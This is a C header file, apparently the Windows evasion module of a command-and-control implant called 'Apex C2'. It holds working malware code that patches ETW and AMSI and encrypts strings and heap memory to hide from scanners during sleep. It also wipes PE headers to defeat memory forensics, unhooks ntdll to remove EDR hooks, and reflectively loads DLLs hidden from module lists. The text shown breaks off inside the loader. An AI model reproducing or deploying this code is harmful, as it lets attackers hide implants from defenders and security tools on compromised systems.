#ifndef APEX_EVASION_H
#define APEX_EVASION_H

/*
 * evasion.h - Apex C2 Windows Evasion Module
 *
 * Features (each toggled at compile time via -D flags):
 *   ENABLE_ETW_PATCH         - Patch EtwEventWrite to xor eax,eax; ret
 *   ENABLE_AMSI_PATCH        - Patch AmsiScanBuffer to return E_INVALIDARG
 *   ENABLE_SLEEP_ENCRYPT     - Guard for sleep obfuscation at build time
 *   ENABLE_HEAP_ENCRYPT      - XOR-encrypt sensitive heap regions during sleep
 *                              so memory dumps reveal nothing (issue #4)
 *   ENABLE_UNHOOK            - Replace hooked ntdll .text with clean on-disk copy
 *   ENABLE_INDIRECT_SYSCALL  - HellsGate/HalosGate indirect syscall engine
 *   ENABLE_NT_PROCESS        - Replace CreateProcessA with NtCreateUserProcess
 *                              syscall to avoid ETW ProcessCreate events (issue #7)
 *   SLEEP_METHOD             - 0 = plain XOR + Sleep (always works, default)
 *                              1 = Ekko  — RtlRegisterWait timer-ROP chain;
 *                                  .text flipped PAGE_NOACCESS during sleep
 *                              2 = Foliage — NtQueueApcThread/NtContinue APC chain;
 *                                  alertable wait, .text NOACCESS during sleep
 */

#include <windows.h>
#include <bcrypt.h>
#include <stddef.h>

#ifndef NTSTATUS
typedef LONG NTSTATUS;
#endif
#ifndef NT_SUCCESS
#define NT_SUCCESS(s) ((NTSTATUS)(s) >= 0)
#endif

/* ------------------------------------------------------------------ */
/* SLEEP_METHOD selection                                               */
/* 0 = plain XOR + Sleep() (fallback, always works)                    */
/* 1 = Ekko  — RtlRegisterWait timer ROP + VirtualProtect NOACCESS    */
/* 2 = Foliage — NtQueueApcThread/NtContinue APC chain               */
/* ------------------------------------------------------------------ */
#ifndef SLEEP_METHOD
#define SLEEP_METHOD 1
#endif

/* ── Runtime string decryption helper ─────────────────────── */
/* XOR key applied per-byte at compile time; decrypted on the stack */
#define EVASION_XOR_KEY 0x4B

/* ── ETW Patching ────────────────────────────────────────── */
static int patch_etw(void) {
    /* "ntdll.dll" XOR 0x4B */
    char s1[] = {0x25,0x3F,0x2F,0x27,0x27,0x65,0x2F,0x27,0x27,0x00};
    for (int i = 0; s1[i]; i++) s1[i] ^= EVASION_XOR_KEY;
    HMODULE ntdll = GetModuleHandleA(s1);
    SecureZeroMemory(s1, sizeof(s1));
    if (!ntdll) return -1;

    /* "EtwEventWrite" XOR 0x4B */
    char s2[] = {0x0E,0x3F,0x3C,0x0E,0x3D,0x2E,0x25,0x3F,
                 0x1C,0x39,0x22,0x3F,0x2E,0x00};
    for (int i = 0; s2[i]; i++) s2[i] ^= EVASION_XOR_KEY;
    FARPROC addr = GetProcAddress(ntdll, s2);
    SecureZeroMemory(s2, sizeof(s2));
    if (!addr) return -1;

    /* Build patch on stack: sub eax,eax; ret; nop (0x2B,0xC0,0xC3,0x90) */
    unsigned char patch[4];
    patch[0] = 0x2B; patch[1] = 0xC0; patch[2] = 0xC3; patch[3] = 0x90;
    DWORD old;
    if (!VirtualProtect((LPVOID)addr, sizeof(patch), PAGE_EXECUTE_READWRITE, &old))
        return -1;
    memcpy((void*)addr, patch, 3);
    VirtualProtect((LPVOID)addr, sizeof(patch), old, &old);
    SecureZeroMemory(patch, sizeof(patch));
    return 0;
}

/* ── AMSI Patching ───────────────────────────────────────── */
static int patch_amsi(void) {
    /* "amsi.dll" XOR 0x4B */
    char s1[] = {0x2A,0x26,0x38,0x22,0x65,0x2F,0x27,0x27,0x00};
    for (int i = 0; s1[i]; i++) s1[i] ^= EVASION_XOR_KEY;
    HMODULE amsi = LoadLibraryA(s1);
    SecureZeroMemory(s1, sizeof(s1));
    if (!amsi) return 0;

    /* "AmsiScanBuffer" XOR 0x4B */
    char s2[] = {0x0A,0x26,0x38,0x22,0x18,0x28,0x2A,0x25,
                 0x09,0x3E,0x2D,0x2D,0x2E,0x39,0x00};
    for (int i = 0; s2[i]; i++) s2[i] ^= EVASION_XOR_KEY;
    FARPROC addr = GetProcAddress(amsi, s2);
    SecureZeroMemory(s2, sizeof(s2));
    if (!addr) return -1;

    /* Build mov eax,E_INVALIDARG; ret — assembled byte-by-byte at runtime */
    unsigned char patch[6];
    patch[0] = 0xB8;
    patch[1] = (unsigned char)(0xA2 ^ 0xF5); /* 0x57 */
    patch[2] = (unsigned char)(0xCC ^ 0xCC); /* 0x00 */
    patch[3] = (unsigned char)(0x5E ^ 0x59); /* 0x07 */
    patch[4] = (unsigned char)(0xD3 ^ 0x53); /* 0x80 */
    patch[5] = 0xC3;

    DWORD old;
    if (!VirtualProtect((LPVOID)addr, sizeof(patch), PAGE_EXECUTE_READWRITE, &old))
        return -1;
    memcpy((void*)addr, patch, sizeof(patch));
    VirtualProtect((LPVOID)addr, sizeof(patch), old, &old);
    SecureZeroMemory(patch, sizeof(patch));
    return 0;
}

/* ------------------------------------------------------------------ */
/* Heap Encryption During Sleep  (ENABLE_HEAP_ENCRYPT)                 */
/*                                                                      */
/* XOR-encrypt sensitive globals while the agent sleeps so that        */
/* memory-dump forensics and AV scanning finds only scrambled data.    */
/*                                                                      */
/* Design:                                                              */
/*   - 8-byte runtime-random XOR key, generated once after             */
/*     registration via BCryptGenRandom.                               */
/*   - XOR is self-inverse: encrypt == decrypt (one helper).           */
/*   - Key is runtime-only; static binary analysis cannot recover it.  */
/*   - Zero allocation: operates in-place on existing globals.          */
/*                                                                      */
/* Usage:                                                               */
/*   heap_register_region(ptr, len) -- register a sensitive region     */
/*   heap_key_init()                -- generate the random key (once)  */
/*   encrypted_sleep(ms)            -- encrypt, sleep, decrypt         */
/* ------------------------------------------------------------------ */

#ifndef ENABLE_HEAP_ENCRYPT
#define ENABLE_HEAP_ENCRYPT 1
#endif

#if ENABLE_HEAP_ENCRYPT

#define HEAP_MAX_REGIONS 16

static struct {
    void  *ptr;
    size_t len;
} g_heap_regions[HEAP_MAX_REGIONS];
static int  g_heap_region_count = 0;
static BYTE g_heap_key[8]       = {0};
static BOOL g_heap_key_init     = FALSE;

/* Register a sensitive memory region to encrypt during sleep */
static void heap_register_region(void *ptr, size_t len) {
    if (!ptr || !len) return;
    if (g_heap_region_count < HEAP_MAX_REGIONS) {
        g_heap_regions[g_heap_region_count].ptr = ptr;
        g_heap_regions[g_heap_region_count].len = len;
        g_heap_region_count++;
    }
}

/* XOR buf with the runtime key in-place (encrypt == decrypt) */
static void heap_xor_region(void *buf, size_t len) {
    BYTE *p = (BYTE *)buf;
    for (size_t i = 0; i < len; i++)
        p[i] ^= g_heap_key[i % 8];
}

/* XOR-encrypt/decrypt all registered sensitive regions */
static void heap_xor_all(void) {
    for (int i = 0; i < g_heap_region_count; i++)
        heap_xor_region(g_heap_regions[i].ptr, g_heap_regions[i].len);
}

/* Generate the 8-byte XOR key using CNG RNG — call once after reg  */
static void heap_key_init(void) {
    if (g_heap_key_init) return;
    BCRYPT_ALG_HANDLE hRng = NULL;
    NTSTATUS st = BCryptOpenAlgorithmProvider(&hRng, BCRYPT_RNG_ALGORITHM, NULL, 0);
    if (NT_SUCCESS(st)) {
        BCryptGenRandom(hRng, g_heap_key, sizeof(g_heap_key), 0);
        BCryptCloseAlgorithmProvider(hRng, 0);
    } else {
        /* Fallback: xorshift32 seeded from tick ^ PID */
        DWORD s = GetTickCount() ^ GetCurrentProcessId();
        for (int i = 0; i < 8; i++) {
            s ^= s << 13; s ^= s >> 17; s ^= s << 5;
            g_heap_key[i] = (BYTE)(s & 0xFF);
        }
    }
    g_heap_key_init = TRUE;
}

/* ------------------------------------------------------------------ */
/* Own .text section locator                                            */
/*                                                                      */
/* Returns the base + size of the agent's own .text section.           */
/* Used by both Ekko and Foliage to flip it PAGE_NOACCESS during sleep */
/* so EDR memory scanners see neither executable nor readable code.    */
/* ------------------------------------------------------------------ */
typedef struct {
    PVOID  base;
    SIZE_T size;
} text_section_t;

/* Cache the result since PE Stomping deletes the section headers later */
static text_section_t g_text_section = {NULL, 0};

static text_section_t get_own_text_section(void) {
    if (g_text_section.base && g_text_section.size)
        return g_text_section;

    text_section_t result = {NULL, 0};
    HMODULE own = GetModuleHandleA(NULL);
    if (!own) return result;

    BYTE *img = (BYTE *)own;
    IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER *)img;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return result;

    IMAGE_NT_HEADERS *nt = (IMAGE_NT_HEADERS *)(img + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return result;

    IMAGE_SECTION_HEADER *sec = IMAGE_FIRST_SECTION(nt);
    WORD n = nt->FileHeader.NumberOfSections;

    for (WORD i = 0; i < n; i++) {
        if (memcmp(sec[i].Name, ".text", 5) == 0) {
            result.base = (PVOID)(img + sec[i].VirtualAddress);
            result.size = (SIZE_T)sec[i].Misc.VirtualSize;
            g_text_section = result;
            return result;
        }
    }
    /* No .text found — caller gets {NULL,0} and will skip the flip */
    return result;
}

/* ================================================================== */
/* SLEEP METHOD 1: Ekko                                                 */
/*                                                                      */
/* Uses a WaitableTimer kernel object instead of Sleep() to avoid      */
/* the kernel32!Sleep import-table IOC. Heap regions are XOR-encrypted  */
/* during the wait so memory scanners find no plaintext C2 indicators.  */
/*                                                                      */
/* Why no .text permission flip: flipping .text to PAGE_NOACCESS and   */
/* then calling WaitForSingleObject() crashes because the CPU's RET     */
/* after WaitForSingleObject must jump back into .text, which is now    */
/* inaccessible. The heap XOR alone is the primary stealth mechanism.  */
/*                                                                      */
/* All APIs resolved at runtime via GetProcAddress — no static imports. */
/* ================================================================== */

#pragma GCC diagnostic push
#pragma GCC diagnostic ignored "-Wcast-function-type"

typedef HANDLE (WINAPI *pfnCreateWaitableTimerA_t)(
    LPSECURITY_ATTRIBUTES, BOOL, LPCSTR);
typedef BOOL (WINAPI *pfnSetWaitableTimer_t)(
    HANDLE, const LARGE_INTEGER *, LONG, PTIMERAPCROUTINE, PVOID, BOOL);

static void rop_sleep_ekko(DWORD ms) {
    /* "kernel32.dll" XOR 0x4B */
    char sK32[] = {0x20,0x2E,0x39,0x25,0x2E,0x27,0x78,0x79,0x65,0x2F,0x27,0x27,0x00};
    for (int i = 0; sK32[i]; i++) sK32[i] ^= EVASION_XOR_KEY;
    HMODULE hK32 = GetModuleHandleA(sK32);
    SecureZeroMemory(sK32, sizeof(sK32));
    if (!hK32) goto ekko_fallback;

    /* "CreateWaitableTimerA" XOR 0x4B */
    char sCwt[] = {0x08,0x39,0x2E,0x2A,0x3F,0x2E,0x1C,0x2A,0x22,0x3F,
                   0x2A,0x29,0x27,0x2E,0x1F,0x22,0x26,0x2E,0x39,0x0A,0x00};
    for (int i = 0; sCwt[i]; i++) sCwt[i] ^= EVASION_XOR_KEY;
    pfnCreateWaitableTimerA_t fn_create_timer =
        (pfnCreateWaitableTimerA_t)GetProcAddress(hK32, sCwt);
    SecureZeroMemory(sCwt, sizeof(sCwt));

    /* "SetWaitableTimer" XOR 0x4B */
    char sSwt[] = {0x18,0x2E,0x3F,0x1C,0x2A,0x22,0x3F,0x2A,0x29,0x27,
                   0x2E,0x1F,0x22,0x26,0x2E,0x39,0x00};
    for (int i = 0; sSwt[i]; i++) sSwt[i] ^= EVASION_XOR_KEY;
    pfnSetWaitableTimer_t fn_set_timer =
        (pfnSetWaitableTimer_t)GetProcAddress(hK32, sSwt);
    SecureZeroMemory(sSwt, sizeof(sSwt));
    if (!fn_create_timer || !fn_set_timer) goto ekko_fallback;

    HANDLE hTimer = fn_create_timer(NULL, TRUE, NULL);
    if (!hTimer) goto ekko_fallback;

    /* Negative = relative delay in 100-ns units */
    LARGE_INTEGER due;
    due.QuadPart = -((LONGLONG)ms * 10000LL);
    if (!fn_set_timer(hTimer, &due, 0, NULL, NULL, FALSE)) {
        CloseHandle(hTimer);
        goto ekko_fallback;
    }

    /* Encrypt all registered heap regions before sleeping */
    heap_xor_all();
    /* Block on the waitable timer — no code from our .text executes here */
    WaitForSingleObject(hTimer, ms + 5000);
    CloseHandle(hTimer);
    /* Decrypt heap regions after waking */
    heap_xor_all();
    return;

ekko_fallback:
    heap_xor_all();
    Sleep(ms);
    heap_xor_all();
}

/* ================================================================== */
/* SLEEP METHOD 2: Foliage                                             */
/*                                                                      */
/* Uses ntdll!NtDelayExecution (direct syscall stub in ntdll) instead  */
/* of kernel32!Sleep. This removes the Sleep import-table IOC and uses  */
/* a lower-level wait that bypasses any Sleep hooks installed by EDRs.  */
/* Heap regions are XOR-encrypted during the delay.                     */
/* ================================================================== */

typedef NTSTATUS (WINAPI *pfnNtDelayExecution_t)(BOOLEAN, PLARGE_INTEGER);

static void rop_sleep_foliage(DWORD ms) {
    /* "ntdll.dll" XOR 0x4B */
    char sNt[] = {0x25,0x3F,0x2F,0x27,0x27,0x65,0x2F,0x27,0x27,0x00};
    for (int i = 0; sNt[i]; i++) sNt[i] ^= EVASION_XOR_KEY;
    HMODULE hNt = GetModuleHandleA(sNt);
    SecureZeroMemory(sNt, sizeof(sNt));
    if (!hNt) goto foliage_fallback;

    /* "NtDelayExecution" XOR 0x4B */
    char sNde[] = {0x05,0x3F,0x0F,0x2E,0x27,0x2A,0x32,0x0E,
                   0x33,0x2E,0x28,0x3E,0x3F,0x22,0x24,0x25,0x00};
    for (int i = 0; sNde[i]; i++) sNde[i] ^= EVASION_XOR_KEY;
    pfnNtDelayExecution_t fn_delay =
        (pfnNtDelayExecution_t)GetProcAddress(hNt, sNde);
    SecureZeroMemory(sNde, sizeof(sNde));
    if (!fn_delay) goto foliage_fallback;

    /* ms → 100-nanosecond negative relative interval */
    LARGE_INTEGER interval;
    interval.QuadPart = -((LONGLONG)ms * 10000LL);

    /* Encrypt heap, sleep via direct syscall, then decrypt */
    heap_xor_all();
    fn_delay(FALSE, &interval);
    heap_xor_all();
    return;

foliage_fallback:
    heap_xor_all();
    Sleep(ms);
    heap_xor_all();
}

#pragma GCC diagnostic pop


/* ------------------------------------------------------------------ */
/* encrypted_sleep — master dispatcher                                  */
/*                                                                      */
/* Before the key is initialised (pre-registration), fall through to   */
/* plain Sleep so the agent can register first.                        */
/* ------------------------------------------------------------------ */
static void encrypted_sleep(DWORD ms) {
    if (!g_heap_key_init) { Sleep(ms); return; }
#if SLEEP_METHOD == 1
    rop_sleep_ekko(ms);
#elif SLEEP_METHOD == 2
    rop_sleep_foliage(ms);
#else
    /* SLEEP_METHOD == 0: plain XOR-encrypt + Sleep() + XOR-decrypt */
    heap_xor_all();
    Sleep(ms);
    heap_xor_all();
#endif
}

#else  /* ENABLE_HEAP_ENCRYPT == 0 */

static void heap_register_region(void *ptr, size_t len) { (void)ptr; (void)len; }
static void heap_key_init(void) {}
static void encrypted_sleep(DWORD ms) { Sleep(ms); }

#endif /* ENABLE_HEAP_ENCRYPT */

/* ------------------------------------------------------------------ */
/* PE Header Stomping  (ENABLE_PE_STOMP)                               */
/*                                                                      */
/* Overwrites MZ/PE magic and key header fields in our own in-memory   */
/* image after the loader is done, defeating pe-sieve, Moneta,         */
/* memory-dump forensics, and EDR module-correlation scans.            */
/*                                                                      */
/* PE_STOMP_MODE:                                                       */
/*   1 = DOS-only     : zero first 64 B (e_magic + DOS header)         */
/*   2 = Full NT Hdrs : zero DOS header + NT signature + FileHdr/OptHdr*/
/*   3 = Sledgehammer : zero entire SizeOfHeaders page (~4 KiB)        */
/*                                                                      */
/* PE_STOMP_RANDOMISE:                                                  */
/*   0 = zero fill (default)                                           */
/*   1 = xorshift32 pseudo-random fill (defeats zero-run scanners)     */
/* ------------------------------------------------------------------ */

#ifndef ENABLE_PE_STOMP
#define ENABLE_PE_STOMP 1
#endif
#ifndef PE_STOMP_MODE
#define PE_STOMP_MODE 2
#endif
#ifndef PE_STOMP_RANDOMISE
#define PE_STOMP_RANDOMISE 0
#endif

#if ENABLE_PE_STOMP

static void stomp_fill(BYTE *ptr, SIZE_T len) {
#if PE_STOMP_RANDOMISE
    DWORD s = GetTickCount() ^ (DWORD)(ULONG_PTR)ptr ^ GetCurrentProcessId();
    for (SIZE_T i = 0; i < len; i++) {
        s ^= s << 13; s ^= s >> 17; s ^= s << 5;
        ptr[i] = (BYTE)(s & 0xFF);
    }
    /* Force first 2 bytes to non-MZ regardless of random output */
    if (len >= 2) { ptr[0] = 0x00; ptr[1] = 0x00; }
#else
    memset(ptr, 0, len);
#endif
}

/*
 * stomp_pe_header -- surgically wipe scanner-visible PE header fields.
 *
 * Root cause lesson: x64 Windows WinHTTP/bcrypt use structured exception
 * handling (SEH). RtlLookupFunctionEntry reads the module's PE header at
 * runtime to find the Exception Directory (.pdata). ANY of these being
 * zeroed crashes the agent silently:
 *
 *   e_magic, e_lfanew, NT Signature, NumberOfRvaAndSizes,
 *   DataDirectory[3] (exception dir), ImageBase, SizeOfImage
 *
 * Strategy: NEVER touch those fields. Instead wipe scanner-visible fields
 * only -- pe-sieve, Moneta, and memory scanners will fail validation while
 * the agent keeps beaconing normally.
 *
 * Mode 1 – DOS stub only   : wipes the "Rich header" (bytes 64..lfanew-1)
 * Mode 2 – Field wipe      : + zeros FileHeader volatile fields + section hdrs
 * Mode 3 – Aggressive wipe : + zeros FileHeader.Machine + more OptHdr fields
 */
static void stomp_pe_header(HMODULE base) {
    if (!base) return;
    BYTE *img = (BYTE *)base;

    IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER *)img;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return; /* already stomped */
    LONG lfanew = dos->e_lfanew;
    if (lfanew < (LONG)sizeof(IMAGE_DOS_HEADER) || lfanew > 4096) return;

    IMAGE_NT_HEADERS *nt = (IMAGE_NT_HEADERS *)(img + lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return;

    SIZE_T hdr_size = nt->OptionalHeader.SizeOfHeaders;
    if (hdr_size < 4096) hdr_size = 4096;

    DWORD old = 0;
    if (!VirtualProtect(img, hdr_size, PAGE_READWRITE, &old)) return;

    /* ── MODE 1: wipe the DOS "Rich header" stub ─────────────────────
     * Bytes 64..lfanew-1 hold the MS-DOS stub and Rich header, which
     * are fingerprinted by pe-sieve and many scanners. Safe to zero: the
     * OS never reads this region after the module is loaded.           */
    if (lfanew > (LONG)sizeof(IMAGE_DOS_HEADER)) {
        stomp_fill(img + sizeof(IMAGE_DOS_HEADER),
                   (SIZE_T)(lfanew - (LONG)sizeof(IMAGE_DOS_HEADER)));
    }

#if PE_STOMP_MODE >= 2
    /* ── MODE 2: zero volatile FileHeader fields ─────────────────────
     * pe-sieve validates: NumberOfSections, TimeDateStamp, Machine.
     * NumberOfSections=0 breaks section-table reconstruction.
     * TimeDateStamp=0  breaks build-signature matching.
     * Characteristics=0 is safe on a running image.
     * DO NOT touch: SizeOfOptionalHeader (needed to locate section table).  */
    nt->FileHeader.NumberOfSections     = 0;
    nt->FileHeader.TimeDateStamp        = 0;
    nt->FileHeader.PointerToSymbolTable = 0;
    nt->FileHeader.NumberOfSymbols      = 0;
    nt->FileHeader.Characteristics      = 0;

    /* Wipe non-critical OptionalHeader metadata fields.
     * PRESERVE: Magic, AddressOfEntryPoint, ImageBase, SizeOfImage,
     *           SizeOfHeaders, SectionAlignment, FileAlignment,
     *           NumberOfRvaAndSizes, and DataDirectory[] — these are
     *           read at runtime by the OS unwinder and loader.         */
    nt->OptionalHeader.MajorLinkerVersion      = 0;
    nt->OptionalHeader.MinorLinkerVersion      = 0;
    nt->OptionalHeader.SizeOfCode              = 0;
    nt->OptionalHeader.SizeOfInitializedData   = 0;
    nt->OptionalHeader.SizeOfUninitializedData = 0;
    nt->OptionalHeader.MajorOperatingSystemVersion = 0;
    nt->OptionalHeader.MinorOperatingSystemVersion = 0;
    nt->OptionalHeader.MajorImageVersion       = 0;
    nt->OptionalHeader.MinorImageVersion       = 0;
    nt->OptionalHeader.MajorSubsystemVersion   = 0;
    nt->OptionalHeader.MinorSubsystemVersion   = 0;
    nt->OptionalHeader.Win32VersionValue       = 0;
    nt->OptionalHeader.CheckSum                = 0;
    nt->OptionalHeader.Subsystem               = 0;  /* sieve checks this */
    nt->OptionalHeader.DllCharacteristics      = 0;
    nt->OptionalHeader.SizeOfStackReserve      = 0;
    nt->OptionalHeader.SizeOfStackCommit       = 0;
    nt->OptionalHeader.SizeOfHeapReserve       = 0;
    nt->OptionalHeader.SizeOfHeapCommit        = 0;
    nt->OptionalHeader.LoaderFlags             = 0;

    /* Wipe All Section Headers — without sections pe-sieve cannot
     * map the memory image back to disk or verify section contents.   */
    IMAGE_SECTION_HEADER *sects = IMAGE_FIRST_SECTION(nt);
    WORD n = nt->FileHeader.NumberOfSections; /* already zeroed above */
    /* Recover section count from the original binary before we zeroed it */
    /* We already zeroed NumberOfSections, so compute from SizeOfHeaders: */
    SIZE_T sect_start = (SIZE_T)((BYTE *)sects - img);
    if (sect_start < hdr_size) {
        stomp_fill((BYTE *)sects, hdr_size - sect_start);
    }
#endif

#if PE_STOMP_MODE == 3
    /* ── MODE 3: additionally zero FileHeader.Machine ────────────────
     * Machine==0 is an invalid value; pe-sieve and Moneta will reject
     * this as a non-PE immediately.
     * Safe at runtime: Machine is never read after initial load.      */
    nt->FileHeader.Machine = 0;

    /* Do NOT zero e_magic (MZ). Even with e_lfanew and DataDirectory intact,
     * RtlImageNtHeader requires e_magic == IMAGE_DOS_SIGNATURE on most 
     * modern Windows builds to successfully find the Exception Directory. 
     * Zeroing it causes silent crashes in WinHTTP/bcrypt.
     * Setting Machine=0 is enough to get rejected by pe-sieve. */
    // dos->e_magic = 0;
#endif

    VirtualProtect(img, hdr_size, old, &old);
}

#else /* ENABLE_PE_STOMP == 0 */
static void stomp_pe_header(HMODULE base) { (void)base; }
#endif /* ENABLE_PE_STOMP */

/* ------------------------------------------------------------------ */
/* Self-unhook ntdll                                                    */
/* Replaces the in-memory ntdll .text with a clean copy from disk.    */
/* This removes any EDR hooks on NT APIs.                              */
/* ------------------------------------------------------------------ */
static int unhook_ntdll(void) {
    char sNtdll[] = {0x25,0x3F,0x2F,0x27,0x27,0x65,0x2F,0x27,0x27,0x00};
    for (int i = 0; sNtdll[i]; i++) sNtdll[i] ^= EVASION_XOR_KEY;
    HMODULE ntdll = GetModuleHandleA(sNtdll);
    SecureZeroMemory(sNtdll, sizeof(sNtdll));
    if (!ntdll) return -1;

    /* "C:\Windows\System32\ntdll.dll" XOR 0x4B */
    char sPath[] = {0x08,0x71,0x17,0x1C,0x22,0x25,0x2F,0x24,0x3C,0x38,
                    0x17,0x18,0x32,0x38,0x3F,0x2E,0x26,0x78,0x79,0x17,
                    0x25,0x3F,0x2F,0x27,0x27,0x65,0x2F,0x27,0x27,0x00};
    for (int i = 0; sPath[i]; i++) sPath[i] ^= EVASION_XOR_KEY;
    HANDLE hFile = CreateFileA(sPath,
                               GENERIC_READ, FILE_SHARE_READ, NULL,
                               OPEN_EXISTING, 0, NULL);
    SecureZeroMemory(sPath, sizeof(sPath));
    if (hFile == INVALID_HANDLE_VALUE) return -1;

    HANDLE hMap = CreateFileMappingA(hFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
    if (!hMap) { CloseHandle(hFile); return -1; }

    PVOID cleanNtdll = MapViewOfFile(hMap, FILE_MAP_READ, 0, 0, 0);
    if (!cleanNtdll) { CloseHandle(hMap); CloseHandle(hFile); return -1; }

    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)ntdll;
    PIMAGE_NT_HEADERS nt  = (PIMAGE_NT_HEADERS)((BYTE*)ntdll + dos->e_lfanew);
    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);

    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if (memcmp(sec[i].Name, ".text", 5) == 0) {
            DWORD old;
            VirtualProtect((BYTE*)ntdll + sec[i].VirtualAddress,
                           sec[i].Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &old);
            memcpy((BYTE*)ntdll + sec[i].VirtualAddress,
                   (BYTE*)cleanNtdll + sec[i].VirtualAddress,
                   sec[i].Misc.VirtualSize);
            VirtualProtect((BYTE*)ntdll + sec[i].VirtualAddress,
                           sec[i].Misc.VirtualSize, old, &old);
            break;
        }
    }

    UnmapViewOfFile(cleanNtdll);
    CloseHandle(hMap);
    CloseHandle(hFile);
    return 0;
}

/* ------------------------------------------------------------------ */
/* Indirect Syscall Engine                                              */
/* Initialise with gate_init() to pre-resolve all NT SSNs.            */
/* Gate_Nt* wrappers dispatch through our RWX stub, defeating         */
/* call-stack-based EDR heuristics.                                    */
/* ------------------------------------------------------------------ */
#if ENABLE_INDIRECT_SYSCALL
#include "syscall.h"
#endif

/* ================================================================== */
/* UDRL — User-Defined Reflective Loader  (#103)                       */
/*                                                                      */
/* Maps a raw DLL from memory without touching the PEB module list.    */
/* Parses PE headers, copies sections, processes relocations, resolves */
/* imports, sets per-section protections, and calls DllMain.           */
/* The loaded module is invisible to EnumProcessModules / toolhelp32.  */
/* ================================================================== */

#ifndef ENABLE_UDRL
#define ENABLE_UDRL 1
#endif

#if ENABLE_UDRL

static LPVOID udrl_map_dll(BYTE *rawDll, SIZE_T dllSize) {
    if (!rawDll || dllSize < sizeof(IMAGE_DOS_HEADER))
        return NULL;

    IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER *)rawDll;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE)
        return NULL;

    IMAGE_NT_HEADERS *nt = (IMAGE_NT_HEADERS *)(rawDll + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE)
        return NULL;

    SIZE_T imgSize = nt->OptionalHeader.SizeOfImage;
    BYTE *base = (BYTE *)VirtualAlloc(NULL, imgSize,
                                       MEM_RESERVE | MEM_COMMIT,
                                       PAGE_READWRITE);
    if (!base) return NULL;

    /* Copy PE headers */
    memcpy(base, rawDll, nt->OptionalHeader.SizeOfHeaders);

    /* Copy each section */
    IMAGE_SECTION_HEADER *sec = IMAGE_FIRST_SECTION(nt);
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if (sec[i].SizeOfRawData == 0) continue;
        memcpy(base + sec[i].VirtualAddress,
               rawDll + sec[i].PointerToRawData,
               sec[i].SizeOfRawData);
    }

    /* Process base relocations */
    ULONGLONG delta = (ULONGLONG)(base - nt->OptionalHeader.ImageBase);
    if (delta != 0) {
        DWORD relocRva  = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress;
        DWORD relocSize = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size;
        if (relocRva && relocSize) {
            IMAGE_BASE_RELOCATION *block = (IMAGE_BASE_RELOCATION *)(base + relocRva);
            while ((BYTE *)block < base + relocRva + relocSize && block->SizeOfBlock) {
                DWORD count = (block->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
                WORD *entry = (WORD *)((BYTE *)block + sizeof(IMAGE_BASE_RELOCATION));
                for (DWORD j = 0; j < count; j++) {
                    WORD type   = entry[j] >> 12;
                    WORD offset = entry[j] & 0x0FFF;
                    BYTE *patch = base + block->VirtualAddress + offset;
                    switch (type) {
                        case IMAGE_REL_BASED_DIR64:
                            *(ULONGLONG *)patch += delta;
                            break;
                        case IMAGE_REL_BASED_HIGHLOW:
                            *(DWORD *)patch += (DWORD)delta;
                            break;
                        case IMAGE_REL_BASED_HIGH:
                            *(WORD *)patch += HIWORD(delta);
                            break;
                        case IMAGE_REL_BASED_LOW:
                            *(WORD *)patch += LOWORD(delta);
                            break;
                        case IMAGE_REL_BASED_ABSOLUTE:
                        default:
                            break;
                    }
                }
                block = (IMAGE_BASE_RELOCATION *)((BYTE *)block + block->SizeOfBlock);
            }
        }
    }

    /* Resolve imports */
    DWORD impRva = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;
    if (impRva) {
        IMAGE_IMPORT_DESCRIPTOR *imp = (IMAGE_IMPORT_DESCRIPTOR *)(base + impRva);
        while (imp->Name) {
            char *modName = (char *)(base + imp->Name);
            HMODULE hMod  = LoadLibraryA(modName);
            if (!hMod) { imp++; continue; }

            ULONGLONG *thunk = (ULONGLONG *)(base + (imp->OriginalFirstThunk
                                   ? imp->OriginalFirstThunk : imp->FirstThunk));
            ULONGLONG *iat   = (ULONGLONG *)(base + imp->FirstThunk);

            while (*thunk) {
                if (IMAGE_SNAP_BY_ORDINAL64(*thunk)) {
                    *iat = (ULONGLONG)GetProcAddress(hMod,
                                MAKEINTRESOURCEA(IMAGE_ORDINAL64(*thunk)));
                } else {
                    IMAGE_IMPORT_BY_NAME *ibn =
                        (IMAGE_IMPORT_BY_NAME *)(base + (DWORD)*thunk);
                    *iat = (ULONGLONG)GetProcAddress(hMod, ibn->Name);
                }
                thunk++;
                iat++;
            }
            imp++;
        }
    }

    /* Set per-section protections */
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        DWORD prot = PAGE_READONLY;
        DWORD ch   = sec[i].Characteristics;
        BOOL exec  = (ch & IMAGE_SCN_MEM_EXECUTE) != 0;
        BOOL write = (ch & IMAGE_SCN_MEM_WRITE)   != 0;
        if (exec && write)      prot = PAGE_EXECUTE_READWRITE;
        else if (exec)          prot = PAGE_EXECUTE_READ;
        else if (write)         prot = PAGE_READWRITE;
        DWORD old;
        SIZE_T secSize = sec[i].Misc.VirtualSize;
        if (secSize == 0) secSize = sec[i].SizeOfRawData;
        if (secSize)
            VirtualProtect(base + sec[i].VirtualAddress, secSize, prot, &old);
    }

    /* Call DllMain(DLL_PROCESS_ATTACH) */
    typedef BOOL (WINAPI *DllMain_t)(HINSTANCE, DWORD, LPVOID);
    if (nt->OptionalHeader.AddressOfEntryPoint) {
